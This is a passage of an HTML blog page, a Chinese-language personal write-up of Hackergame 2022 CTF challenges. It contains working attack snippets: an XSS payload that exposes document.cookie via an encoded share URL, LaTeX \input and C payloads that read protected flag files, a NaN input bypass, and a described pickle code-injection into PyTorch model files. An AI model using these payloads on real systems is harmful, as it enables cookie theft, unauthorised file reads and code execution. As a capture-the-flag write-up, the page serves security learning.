@@ -1,0 +1,993 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <title>Hackergame 2022 题解 - GWDx</title>
+  <meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+
+<meta name="author" content="GWDx" /><meta name="description" content="Hackergame 2022（中科大第九届信息安全大赛）个人题解
+" /><meta name="keywords" content="Hackergame" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.104.3 with theme even" />
+
+
+<link rel="canonical" href="http://gwdx.me/post/hackergame2022/" />
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/manifest.json">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+<link href="/sass/main.min.72441d79d2711e0cc119d42d0156af41c22d189d5ece51265b8d72a51ce80b9c.css" rel="stylesheet">
+<link href="/lib/fancybox/jquery.fancybox-3.1.20.min.css" rel="stylesheet">
+
+
+<meta property="og:title" content="Hackergame 2022 题解" />
+<meta property="og:description" content="Hackergame 2022（中科大第九届信息安全大赛）个人题解
+" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://gwdx.me/post/hackergame2022/" /><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2022-10-31T00:00:00+00:00" />
+<meta property="article:modified_time" content="2022-11-02T20:01:25+08:00" />
+
+<meta itemprop="name" content="Hackergame 2022 题解">
+<meta itemprop="description" content="Hackergame 2022（中科大第九届信息安全大赛）个人题解
+"><meta itemprop="datePublished" content="2022-10-31T00:00:00+00:00" />
+<meta itemprop="dateModified" content="2022-11-02T20:01:25+08:00" />
+<meta itemprop="wordCount" content="5326">
+<meta itemprop="keywords" content="Hackergame,CTF," /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Hackergame 2022 题解"/>
+<meta name="twitter:description" content="Hackergame 2022（中科大第九届信息安全大赛）个人题解
+"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/" class="logo">GWDx</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <a href="/">
+        <li class="mobile-menu-item">主页</li>
+      </a><a href="/post/">
+        <li class="mobile-menu-item">归档</li>
+      </a><a href="/tags/">
+        <li class="mobile-menu-item">标签</li>
+      </a><a href="/categories/">
+        <li class="mobile-menu-item">分类</li>
+      </a><a href="/about/">
+        <li class="mobile-menu-item">关于</li>
+      </a>
+  </ul>
+
+  
+
+
+</nav>
+
+  <div class="container" id="mobile-panel">
+    <header id="header" class="header">
+        <div class="logo-wrapper">
+  <a href="/" class="logo">GWDx</a>
+</div>
+
+
+
+
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    <li class="menu-item">
+        <a class="menu-item-link" href="/">主页</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/post/">归档</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/tags/">标签</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/categories/">分类</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/about/">关于</a>
+      </li>
+  </ul>
+</nav>
+
+    </header>
+
+    <main id="main" class="main">
+      <div class="content-wrapper">
+        <div id="content" class="content">
+          <article class="post">
+    
+    <header class="post-header">
+      <h1 class="post-title">Hackergame 2022 题解</h1>
+
+      <div class="post-meta">
+        <span class="post-time"> 2022-10-31 </span>
+        
+        
+      </div>
+    </header>
+
+    
+    <div class="post-content">
+      <p>Hackergame 2022（中科大第九届信息安全大赛）个人题解</p>
+<p><img src="/post/hackergame2022/image/board.png" alt="board"></p>
+<h2 id="环境">环境</h2>
+<ul>
+<li>Debian Bookworm</li>
+<li>Python 3.10</li>
+</ul>
+<h2 id="完成的题目">完成的题目</h2>
+<h3 id="16-二次元神经网络">16 二次元神经网络</h3>
+<blockquote>
+<p>2022 年 10 月 22 日 12 时，Hackergame 2022 正式开始</p>
+</blockquote>
+<p>签到、Xcaptcha、Latex 机器人各做了十几分钟，然而都没做出来</p>
+<blockquote>
+<p>12:40 - 13:30</p>
+</blockquote>
+<p>开始炼这题的丹。感觉参数量有点小，Loss 不太能降的下来</p>
+<blockquote>
+<p>14:20</p>
+</blockquote>
+<p>发现这题是 web 类型的题目，感觉并不是让我们训练网络或者解不等式。</p>
+<p>我对 AI 绘画很感兴趣，之前 bilibili 上 NovelAI 相关的视频看了不少。其中有一个 <a href="https://www.bilibili.com/video/BV1BN4y1c7KX/">你的NovelAI模型，极有可能被恶意攻击</a> 提到了 pickle 模块可能存在安全问题。但是里面的代码只展示了 pkl 文件的读取和写入，没有 pt 文件的读取和写入。</p>
+<p>把 pt 文件解压缩可以得到一个 pkl 文件，然而直接用 packle 载入会报错。把 PyTorch 版本换成题目中的 1.9 也不行。尝试调试库代码，以失败告终。</p>
+<blockquote>
+<p>15:30</p>
+</blockquote>
+<p>Google 了好久，终于用 <code>pickle Serialization danger pytorch</code> 找到了一个示例 <a href="https://www.youtube.com/watch?v=2ethDz9KnLk">The hidden dangers of loading open-source AI models (ARBITRARY CODE EXPLOIT!)</a>，作者写了一个库 <a href="https://github.com/yk/patch-torch-save">yk/patch-torch-save</a>，这个函数可以替换 <code>torch.save</code> 实现代码注入。</p>
+<p>试了一下在要上传的模型中注入 <code>exit</code> 进去，发现确实可以让后台崩掉。</p>
+<p>实现时需要阻止在执行注入的代码后按照 pt 文件后面的数据保存结果。于是重写 <code>json.dump</code> 函数，让服务器在调用这个函数时把数据集的前十张图片导出到 <code>/tmp/result.json</code></p>
+<blockquote>
+<p>完整代码见 <a href="22/patch.py">patch.py</a></p>
+</blockquote>
+<p>感谢 Stable Diffusion，感谢 NovelAI，我拿到了第一个 flag，获得了这一题的一血，守护了科大这片二次元的土地。</p>
+<br>
+<h3 id="1-签到">1 签到</h3>
+<p>一开始点开签到，画了一下没画出来，开始把网页下载下来看代码。</p>
+<p>后来感觉分析 JavaScript 代码不是签到题该有的难度。忽然发现点击提交后 URL 会变，把请求内容改成 2022 就可以了。</p>
+<br>
+<h3 id="2-猫咪问答喵">2 猫咪问答喵</h3>
+<ol>
+<li>百度 <code>USTC NEBULA 成立时间</code>，<a href="https://www.cas.cn/djcx/wm/201706/t20170616_4605231.shtml">中国科大“星云战队”获信息安全铁人三项赛华东区企业赛冠军</a> 中提到成立时间是 2017-03</li>
+<li>找到 <a href="https://ftp.lug.ustc.edu.cn/%E6%B4%BB%E5%8A%A8/2022.9.20_%E8%BD%AF%E4%BB%B6%E8%87%AA%E7%94%B1%E6%97%A5/slides/gnome-wayland-user-perspective.pdf">gnome-wayland-user-perspective.pdf</a>，里面的是 Kdenlive 的界面</li>
+<li>发现会提示答对了几道题，所以网上随便查，往上填，发现是 12。</li>
+<li>用 Google 查找 <code>CVE-2021-4034 torvalds/linux.git</code> 得到 <a href="https://lore.kernel.org/all/CAODzB9proCGmsbhFuuOhx=pgwqsGsXEjz2Smd+S97_gFL-A5Dw@mail.gmail.com/T/">New CVE entries this week</a></li>
+<li>一开始查不到，Wiki 上找了一些域名碰运气，失败。
+后来发现 Bing 国际版直接查找 <code>MD5:e4:ff:65:d7:be:5d:c8:44:1d:89:6b:50:f5:50:a0:ce</code> 即可得到 <code>sdf.org</code>
+百度垃圾，Google 垃圾。</li>
+<li>找到 <a href="https://www.ustc.edu.cn/info/1057/4931.htm">关于实行新的网络费用分担办法的通知</a>，但 2011-01-01 不对。
+用脚本枚举出来是 2003-03-01</li>
+</ol>
+<br>
+<h3 id="3-家目录里的秘密">3 家目录里的秘密</h3>
+<h4 id="vs-code-里的-flag">VS Code 里的 flag</h4>
+<p>第一问 VSCode 一开，查 <code>flag</code> 就行</p>
+<h4 id="rclone-里的-flag">Rclone 里的 flag</h4>
+<p>第二问找到 <code>~/.bash_history</code>
+以及 <code>~/.config/rclone/rclone.conf</code>，但里面的 FTP 连不上。在家目录里找域名或 IP 填进去都不行。</p>
+<p>后来照着 <code>~/.bash_history</code> 打了一遍命令，发现 Rclone 存储的 <code>pass</code> 比输入的长，猜测进行了加密。</p>
+<p>查到了 <a href="https://forum.rclone.org/t/how-to-retrieve-a-crypt-password-from-a-config-file/20051/3">How to retrieve a crypt password from a config file</a></p>
+<p>装个 <code>go</code>，把里面的代码跑一跑，flag 就出来了。</p>
+<blockquote>
+<p>说得倒是很轻松，事实上花了不少时间呢。</p>
+<p>感觉 MISC 题在考智商，能不能领会到出题人的想法</p>
+</blockquote>
+<br>
+<h3 id="4-heilang">4 HeiLang</h3>
+<p>正则表达式替换</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;getflag.hei.py&#39;</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">code</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">code</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># find a[(.*)] = (.*)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">re</span><span class="o">.</span><span class="n">match</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;a\[(.*)\] = (.*)&#39;</span><span class="p">,</span> <span class="n">line</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">match</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">match</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;a\[(.*)\] = (.*)&#39;</span><span class="p">,</span> <span class="n">line</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span> <span class="n">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">2</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39; | &#39;</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">            <span class="n">result</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s1">&#39;a[&#39;</span> <span class="o">+</span> <span class="n">i</span> <span class="o">+</span> <span class="s1">&#39;] = &#39;</span> <span class="o">+</span> <span class="n">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">2</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">result</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">line</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;getflag.hei.py&#39;</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">result</span><span class="p">))</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><br>
+<h3 id="5-xcaptcha">5 Xcaptcha</h3>
+<p>使用 Python 的 Selenium 库，模拟人工操作。一开始代码写错了，用 Kazam 录屏后才发现错误</p>
+<p>代码见 <a href="5/run.py">run.py</a></p>
+<br>
+<h3 id="6-旅行照片-20">6 旅行照片 2.0</h3>
+<h4 id="照片分析">照片分析</h4>
+<p>KDE 自带的图片管理器可以显示图片的 EXIF 信息。</p>
+<blockquote>
+<p>闪光灯对应的是 <code>Flash</code> 一栏，当时没注意到</p>
+</blockquote>
+<h4 id="社工入门">社工入门</h4>
+<ul>
+<li>使用 <code>welcome to zozo stadium japan</code> 查到了。邮编用 Google Postcodes 或者 Bing 查到。注意拍摄地点在马路对面</li>
+<li>手机分辨率：用京东查小米手机，看着像 Redmi Note 9，百度百科说分辨率是 2340x1080</li>
+<li>用 <a href="https://www.flightradar24.com/">flightradar24</a> 查航班。根据飞机方向判断起飞机场是东京机场或者南面的一个机场。然后用脚本枚举</li>
+</ul>
+<br>
+<h3 id="7-猜数字">7 猜数字</h3>
+<p>每次有 10^-6 次方的概率一下子猜对，就算每次交互 1s，也要 11 天。所以不可能暴力。</p>
+<p>观察了一下随机数，没有发现问题。</p>
+<p>后来看到这段代码，估计是 <code>NaN</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">var</span> <span class="n">isLess</span> <span class="o">=</span> <span class="n">guess</span> <span class="o">&lt;</span> <span class="k">this</span><span class="o">.</span><span class="na">number</span> <span class="o">-</span> <span class="n">1e</span><span class="o">-</span><span class="n">6</span> <span class="o">/</span> <span class="n">2</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">var</span> <span class="n">isMore</span> <span class="o">=</span> <span class="n">guess</span> <span class="o">&gt;</span> <span class="k">this</span><span class="o">.</span><span class="na">number</span> <span class="o">+</span> <span class="n">1e</span><span class="o">-</span><span class="n">6</span> <span class="o">/</span> <span class="n">2</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">var</span> <span class="n">isPassed</span> <span class="o">=</span> <span class="o">!</span><span class="n">isLess</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">isMore</span><span class="o">;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>不知道为什么 Firefox 的重发有问题，我最后是用 Python 发的。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;state&gt;&lt;guess&gt;</span>NaN<span class="nt">&lt;/guess&gt;&lt;/state&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><br>
+<h3 id="8-latex-机器人">8 LaTeX 机器人</h3>
+<h4 id="纯文本">纯文本</h4>
+<p>Copilot 教会我用 <code>\input</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-latex" data-lang="latex"><span class="line"><span class="cl"><span class="k">\input</span><span class="nb">{</span>/flag1<span class="nb">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p>刚开始可能是没加 <code>/</code>，所以报错了</p>
+</blockquote>
+<h4 id="特殊字符混入">特殊字符混入</h4>
+<p>很多需要导入包的都不太行。Google 了好久，终于找到 <a href="https://tex.stackexchange.com/questions/38909/how-to-import-a-text-file-with-accent-special-chars">How to import a text file</a>，发现可以用 <code>\catcode</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-latex" data-lang="latex"><span class="line"><span class="cl"><span class="k">\catcode</span>`<span class="k">\_</span>=12
+</span></span><span class="line"><span class="cl"><span class="k">\catcode</span>`<span class="k">\#</span>=12
+</span></span><span class="line"><span class="cl"><span class="k">\input</span><span class="nb">{</span>/flag2<span class="nb">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><br>
+<h3 id="9-flag-的痕迹">9 Flag 的痕迹</h3>
+<p>一开始以为要找出用户名和密码。</p>
+<p>后来点着点着发现 URL 里有 <code>do=</code>。源码里见过，根据源码改成 <code>do=diff</code></p>
+<p>http://202.38.93.111:15004/doku.php?id=start&amp;do=diff</p>
+<p>然后鼠标点之前的版本，就能得到 flag 了。</p>
+<blockquote>
+<p>我也花了挺久的</p>
+</blockquote>
+<br>
+<h3 id="10-安全的在线测评">10 安全的在线测评</h3>
+<h4 id="无法-ac-的题目">无法 AC 的题目</h4>
+<blockquote>
+<p>这题让我想起了 <a href="https://www.zhihu.com/question/433907534">如何看待 NOIP2020 某选手通过修改输入文件获得了第三题的满分？</a></p>
+</blockquote>
+<p><code>fopen</code> 目标输出文件，然后打印出来即可</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// read ./data/static.out and print
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">FILE</span><span class="o">*</span> <span class="n">fp</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">&#34;./data/static.out&#34;</span><span class="p">,</span> <span class="s">&#34;r&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span><span class="n">fgets</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mi">1024</span><span class="p">,</span> <span class="n">fp</span><span class="p">)</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;%s&#34;</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>得到 <code>flag{the_compiler_is_my_eyes_deba6df85e}</code></p>
+<h4 id="动态数据">动态数据</h4>
+<p><code>fopen</code> 不行了，没有读权限。</p>
+<p>上一小问的 flag 提示在编译时 <code>include</code> 目标文件。但直接 include 不行，因为两个数字间有换行。</p>
+<p><a href="https://stackoverflow.com/questions/4158900/embedding-resources-in-executable-using-gcc">Embedding resources in executable using GCC</a> 中提到了 <a href="https://github.com/graphitemaster/incbin">incbin</a> 这个库，可以包含数据文件</p>
+<p>代码见 <a href="10/raw.c">raw.c</a></p>
+<p>为了避免包含这个库，可以用 <code>gcc -E</code> 预处理一下，然后把没用的代码删掉，提交的文件见 <a href="10/submit.c">submit.c</a></p>
+<blockquote>
+<p>暑假时查过编译时 include 文件的资料，但当时没找到，这次学到了。</p>
+</blockquote>
+<br>
+<h3 id="11-线路板">11 线路板</h3>
+<p>安装 Gerbv</p>
+<p>加载所有 <code>*.gbr</code> 文件，然后发现 <code>fla</code> 字样，把所有挡住的圆盘删掉，获得 flag。</p>
+<blockquote>
+<p>一开始装了个免费版的 Altium Designer，没用</p>
+</blockquote>
+<br>
+<h3 id="12-flag-自动机">12 Flag 自动机</h3>
+<p>直接打开有两个按钮，鼠标左键 + Alt + Space 乱按有概率颠倒按钮，但还是会显示没有管理员权限。</p>
+<p>使用 Detect_it_Easy，没有发现壳。</p>
+<p>用文本编辑器打开文件会显示一些文字，比如 <code>flag_machine.txt</code></p>
+<p>学习了一下 IDA 的使用。找到了 <code>fwrite</code> 的位置。根据反汇编的代码，将判断语句 <code>jnz</code> 更改为 <code>jz</code></p>
+<br>
+<h3 id="13-微积分计算小练习">13 微积分计算小练习</h3>
+<p><code>bot.py</code> 调用 selenium 打开网页。需要更改 URL 的参数获得 cookie</p>
+<p>查看 http://202.38.93.111:10056/share?result=MTAwOkdXRHg%3D 的页面源代码</p>
+<p>微积分网站中的 URL 是经过 base64 和 URL 编码的</p>
+<p>解码后是 <code>GWDx:100</code></p>
+<p>查看 JavaScript 代码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">result</span> <span class="o">=</span> <span class="nx">urlParams</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;result&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">b64decode</span> <span class="o">=</span> <span class="nx">atob</span><span class="p">(</span><span class="nx">result</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">colon</span> <span class="o">=</span> <span class="nx">b64decode</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="s2">&#34;:&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">score</span> <span class="o">=</span> <span class="nx">b64decode</span><span class="p">.</span><span class="nx">substring</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">colon</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">username</span> <span class="o">=</span> <span class="nx">b64decode</span><span class="p">.</span><span class="nx">substring</span><span class="p">(</span><span class="nx">colon</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">document</span><span class="p">.</span><span class="nx">querySelector</span><span class="p">(</span><span class="s2">&#34;#greeting&#34;</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="s2">&#34;您好，&#34;</span> <span class="o">+</span> <span class="nx">username</span> <span class="o">+</span> <span class="s2">&#34;！&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">document</span><span class="p">.</span><span class="nx">querySelector</span><span class="p">(</span><span class="s2">&#34;#score&#34;</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="s2">&#34;您在练习中获得的分数为 &lt;b&gt;&#34;</span> <span class="o">+</span> <span class="nx">score</span> <span class="o">+</span> <span class="s2">&#34;&lt;/b&gt;/100。&#34;</span><span class="p">;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>经过尝试，填入 <code>&lt;script&gt;</code> 不会被更新。而 <a href="https://zhuanlan.zhihu.com/p/26177815">浅谈XSS攻击的那些事</a> 中提到可以用 <code>&lt;img src=1 onerror=</code> 进行 XSS 攻击</p>
+<p>所以构造</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;1&#34;</span> <span class="na">onerror</span><span class="o">=</span><span class="s">document.querySelector(&#34;#greeting&#34;).innerHTML=document.cookie</span><span class="p">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>加上 <code>:</code>，base64 和 URL 编码后得到</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://202.38.93.111:10056/share?result=OjxpbWcgc3JjPSIxIiBvbmVycm9yPWRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoIiNncmVldGluZyIpLmlubmVySFRNTD1kb2N1bWVudC5jb29raWU%2B
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>填入提交网站即可获得 flag</p>
+<br>
+<h3 id="14-杯窗鹅影">14 杯窗鹅影</h3>
+<h4 id="flag1">flag1</h4>
+<p><code>fopen</code> 直接读</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// open /flag1 and print it
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">FILE</span><span class="o">*</span> <span class="n">f</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">&#34;/flag1&#34;</span><span class="p">,</span> <span class="s">&#34;r&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="n">fgets</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="n">f</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;%s&#34;</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">fclose</span><span class="p">(</span><span class="n">f</span><span class="p">);</span>
